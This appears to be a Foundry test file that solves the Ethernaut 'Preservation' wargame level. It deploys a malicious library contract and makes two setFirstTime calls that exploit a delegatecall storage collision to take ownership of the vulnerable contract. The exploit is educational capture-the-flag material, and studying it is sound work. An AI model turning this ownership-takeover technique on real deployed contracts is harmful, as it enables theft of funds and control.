// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/vm.sol";
import "ds-test/test.sol";
import "../src/Ethernaut.sol";
import "../src/levels/Preservation/PreservationFactory.sol";
import "../src/levels/Preservation/Preservation.sol";
import "../src/levels/Preservation/MaliciousLibraryContract.sol";

contract PreservationTest is DSTest {
    Ethernaut ethernaut;
    PreservationFactory preservationFactory;
    Vm private constant vm = Vm(HEVM_ADDRESS);
    address eoaAddress = address(69);

    function setUp() public {
        ethernaut = new Ethernaut();
        preservationFactory = new PreservationFactory();
        ethernaut.registerLevel(preservationFactory);
    }

    function testIsPreservationCleared() public {
        vm.startPrank(eoaAddress);
        address instanceAddress = ethernaut.createLevelInstance(
            preservationFactory
        );
        Preservation preservation = Preservation(instanceAddress);

        MaliciousLibraryContract maliciousLibraryContract = new MaliciousLibraryContract();

        uint256 timeStamp = uint256(uint160(address(maliciousLibraryContract)));
        preservation.setFirstTime(timeStamp);

        timeStamp = uint256(uint160(eoaAddress));
        preservation.setFirstTime(timeStamp);

        assertTrue(ethernaut.submitLevelInstance(payable(instanceAddress)));

        vm.stopPrank();
    }
}
